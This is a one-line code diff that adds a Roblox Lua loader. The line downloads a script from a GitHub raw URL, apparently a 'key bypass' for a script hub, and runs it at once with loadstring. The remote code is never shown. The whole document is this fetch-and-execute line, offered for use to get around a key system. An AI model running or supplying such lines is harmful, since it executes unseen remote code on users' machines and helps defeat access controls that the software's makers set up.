@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xet55/scripts/main/ovhz-crazyhubkeybypass.lua"))()
